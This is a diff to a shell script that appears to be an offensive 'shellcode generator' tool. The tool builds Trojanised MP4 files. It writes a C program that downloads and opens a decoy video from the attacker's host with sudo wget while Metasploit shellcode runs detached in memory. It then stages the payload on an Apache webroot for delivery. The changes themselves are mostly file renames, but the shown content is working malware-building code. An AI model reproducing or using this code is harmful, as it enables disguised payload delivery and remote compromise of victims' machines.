@@ -8167,7 +8167,7 @@ cat << !
     | LHOST   : $lhost
     | FORMAT  : C -> LINUX
     | PAYLOAD : $paylo
-    | MP4VIDEO: $IPATH/output/stream.mp4
+    | MP4VIDEO: $IPATH/output/streaming.mp4
     |_TROJAN  : $IPATH/output/$mP4.mp4
 
 !
@@ -8182,8 +8182,8 @@ fi
 # Parse mp4 video name for transformation
 echo "$appl" > /tmp/test.txt
 N4m=$(grep -oE '[^/]+$' /tmp/test.txt) > /dev/null 2>&1
-echo "[☠] Rename mp4 from: $N4m To: stream.mp4" && sleep 2
-cp $appl $IPATH/output/stream.mp4 > /dev/null 2>&1
+echo "[☠] Rename mp4 from: $N4m To: streaming.mp4" && sleep 2
+cp $appl $IPATH/output/streaming.mp4 > /dev/null 2>&1
 
 
 # use metasploit to build shellcode (msf encoded)
@@ -8225,12 +8225,12 @@ echo "   */" >> $mP4.c
 echo "   fflush(NULL);" >> $mP4.c
 echo "   int pid = fork();" >> $mP4.c
 echo "      if (pid > 0) {" >> $mP4.c
-echo "         system(\"sudo /usr/bin/wget -qq http://$lhost/stream.mp4 -O /tmp/stream.mp4 && sudo /usr/bin/xdg-open /tmp/stream.mp4 > /dev/nul 2>&1\");" >> $mP4.c
+echo "         system(\"sudo /usr/bin/wget -qq http://$lhost/streaming.mp4 -O /tmp/streaming.mp4 && sudo /usr/bin/xdg-open /tmp/streaming.mp4 > /dev/nul 2>&1 & exit\");" >> $mP4.c
 echo "      }" >> $mP4.c
 echo "      else if (pid == 0) {" >> $mP4.c
 echo "         /*" >> $mP4.c
 echo "         We are running in child process (as backgrond job - orphan)." >> $mP4.c
-echo "         setsid(); allow us to detach the child (shellcode) from parent (stream.mp4) process," >> $mP4.c
+echo "         setsid(); allow us to detach the child (shellcode) from parent (streaming.mp4) process," >> $mP4.c
 echo "         allowing us to continue running the shellcode in ram even if parent process its terminated." >> $mP4.c
 echo "         */" >> $mP4.c
 echo "         setsid();" >> $mP4.c
@@ -8249,12 +8249,12 @@ echo "[☠] Port all files to apache2 webroot .." && sleep 2
 zip $mP4.zip $mP4.mp4 > /dev/null 2>&1
 cp $IPATH/output/$mP4.mp4 $ApAcHe/$mP4.mp4 > /dev/null 2>&1
 cp $IPATH/output/$mP4.zip $ApAcHe/$mP4.zip > /dev/null 2>&1
-cp $IPATH/output/stream.mp4 $ApAcHe/stream.mp4 > /dev/null 2>&1
+cp $IPATH/output/streaming.mp4 $ApAcHe/streaming.mp4 > /dev/null 2>&1
 cd $IPATH
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$mP4.mp4\n\nchose how to deliver: $mP4.mp4" --radiolist --column "Pick" --column "Option" FALSE "multi-handler (default)" TRUE "Oneliner (download/auto-exec)" --width 305 --height 220) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$mP4.mp4\n\nchose how to deliver: $mP4.mp4" --radiolist --column "Pick" --column "Option" FALSE "multi-handler (default)" TRUE "Oneliner (download/exec)" --width 305 --height 220) > /dev/null 2>&1
 
 
 if [ "$serv" = "multi-handler (default)" ]; then
@@ -12538,4 +12538,5 @@ e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2 ;;
 esac
 done
+
 
